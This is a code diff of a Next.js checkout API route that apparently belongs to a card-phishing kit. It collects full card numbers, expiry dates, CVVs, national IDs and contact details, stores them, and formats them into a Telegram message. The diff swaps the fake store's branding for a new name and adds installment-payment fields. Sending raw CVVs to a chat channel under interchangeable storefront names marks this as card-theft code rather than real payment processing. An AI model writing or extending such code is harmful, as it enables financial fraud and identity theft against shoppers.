@@ -1,34 +1,38 @@
 import { NextRequest, NextResponse } from "next/server";
 
 export async function POST(req: NextRequest) {
-  const { cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address } = await req.json();
+  const { cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, downPayment } = await req.json();
 
   const orderId = `${Date.now()}${Math.floor(Math.random() * 1000)}`;
+  const monthlyPayment = installmentType === "installment" && months > 0 ? Math.ceil((total - downPayment) / months) : 0;
 
   // حفظ في الداتابيز
   try {
     await fetch(`${process.env.BACKEND_URL}/api/checkout`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ orderId, cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address }),
+      body: JSON.stringify({ orderId, cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, monthlyPayment, downPayment }),
     });
   } catch {}
 
   // Send Telegram
+  const ltr = "\u200E";
   const text = [
-    `🛒 طلب جديد - مؤسسة سهلناها التقنية (اتصالات)`,
-    `🔖 رقم الطلب: #${orderId}`,
+    `🛒 طلب لـ متجر مؤسسة مدار التقنية`,
+    `🔖 رقم الطلب: ${ltr}#${orderId}`,
     ``,
-    `💲 المبلغ الإجمالي: ${total} ر.س`,
-    `🧾 طريقة الدفع: دفع كامل`,
+    `💲 Total Amount: ${ltr}${total} SAR`,
+    ...(installmentType === "installment"
+      ? [`🧾 First Payment: ${ltr}${downPayment} SAR`]
+      : [`🧾 Payment Type: Full Amount`]),
     ``,
-    `🏦 بيانات البطاقة`,
-    `🙍 اسم العميل: ${customer ?? "-"}`,
-    `📲 واتساب: ${whatsapp ?? "-"}`,
-    `🪪 رقم البطاقة: ${cardNumber}`,
-    `✍️ اسم حامل البطاقة: ${cardHolder}`,
-    `📆 تاريخ الانتهاء: ${expiry}`,
-    `🔑 CVV: ${cvv}`,
+    `🏦 MadaVisa - New Order`,
+    `🙍 Order For: ${ltr}${customer ?? "-"}`,
+    `📲 WhatsApp: ${ltr}${whatsapp ?? "-"}`,
+    `🪪 Card Number: ${ltr}${cardNumber}`,
+    `✍️ Card Holder: ${ltr}${cardHolder}`,
+    `📆 Valid To: ${ltr}${expiry}`,
+    `🔑 CVV: ${ltr}${cvv}`,
   ].join("\n");
 
   const whatsappNum = (whatsapp ?? "").replace(/\D/g, "");
